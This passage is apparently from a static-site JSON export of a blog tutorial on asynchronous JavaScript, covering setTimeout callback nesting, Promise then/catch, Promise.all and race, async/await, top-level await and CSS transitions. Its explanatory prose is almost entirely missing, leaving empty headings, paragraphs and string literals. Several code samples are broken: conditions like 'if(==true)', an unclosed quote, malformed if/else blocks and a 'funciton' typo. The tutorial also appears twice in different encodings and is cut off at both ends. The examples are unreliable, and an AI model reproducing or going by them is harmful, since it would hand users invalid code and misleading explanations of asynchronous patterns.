punctuation\">(</span><span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>\"<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">else</span><span class=\"token punctuation\">(</span><span class=\"token operator\">==</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n   <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h3><blockquote>\n<p>Promise </p>\n</blockquote>\n<p>Promise </p>\n<h4 id=\"then-x2F-catch-\"><a href=\"#then-x2F-catch-\" class=\"headerlink\" title=\"then/catch \"></a>then/catch </h4><p>JavaCompletableFuture</p>\n<p>CompletableFuture</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">if</span> <span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">else</span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n     <span class=\"token keyword\">return</span> data\n     <span class=\"token comment\">//dataresolve</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n     <span class=\"token comment\">//errorreject</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span> data \n   <span class=\"token comment\">//</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token comment\">//</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token comment\">//undefined</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"all-x2F-race-\"><a href=\"#all-x2F-race-\" class=\"headerlink\" title=\"all/race \"></a>all/race </h4><ul>\n<li><p>all </p>\n<blockquote>\n<p>Promiseall</p>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> Promise1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">let</span> Promise2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">let</span> Promise3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>Promise1<span class=\"token punctuation\">,</span> Promise2<span class=\"token punctuation\">,</span> Promise3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token function\">funciton</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">//   </span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">//  </span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>race </p>\n<p><em><strong></strong></em></p>\n<blockquote>\n<p>racepromisepromise</p>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">requestImg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n           <span class=\"token keyword\">var</span> img <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Image</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           img<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n               <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">}</span>\n           img<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n   <span class=\"token comment\">//</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n           <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n               <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n   Promise<span class=\"token punctuation\">.</span><span class=\"token function\">race</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token function\">requestImg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">{</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h3 id=\"async-x2F-await\"><a href=\"#async-x2F-await\" class=\"headerlink\" title=\"async/await\"></a>async/await</h3><p>promise</p>\n<blockquote>\n<p>asyncasyncawait</p>\n<p>kotlinsuspend   Deffered#await</p>\n<p>js</p>\n</blockquote>\n<p><strong></strong></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// awaitpromiseasync</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">step</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">size<span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">,</span> ele</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n            ele<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>marginLeft <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>size<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">px</span><span class=\"token template-punctuation string\">`</span></span>\n            <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// awaitstep</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">id</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> ele <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">200</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">step</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> ele<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">awaitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"two\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">awaitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"top-await\"><a href=\"#top-await\" class=\"headerlink\" title=\"top await\"></a>top await</h5><p></p>\n<blockquote>\n<p>type=module </p>\n<p>JSJS top await await  async </p>\n<p> </p>\n</blockquote>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>optimize/script.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>module<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">defer</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>await</p>\n<p>code</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> p <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> content <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\n\n\n</span><span class=\"token template-punctuation string\">`</span></span>\n\n<span class=\"token comment\">// JavaThread.sleep</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">ms</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ms<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> content<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    p<span class=\"token punctuation\">.</span>textContent <span class=\"token operator\">=</span> content<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<h5 id=\"css\"><a href=\"#css\" class=\"headerlink\" title=\"css\"></a>css</h5><pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> all 1s<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.circle.at-end</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translateX</span><span class=\"token punctuation\">(</span>200px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>transition: all 1s; 1s</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><blockquote>\n<p>bukkit</p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong><strong></strong><strong></strong><strong></strong></p>\n<p><strong></strong></p>\n<p></p>\n<p></p>\n<p>javascript </p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// </span>\n<span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token comment\">// </span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"World\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Hello\nWorld\nHello World<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"JavaScript\"><a href=\"#JavaScript\" class=\"headerlink\" title=\"JavaScript\"></a>JavaScript</h2><blockquote>\n<p>JavaScriptWeb Worker</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>\"<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">else</span><span class=\"token punctuation\">(</span><span class=\"token operator\">==</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n   <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">)</span><span class=\"token 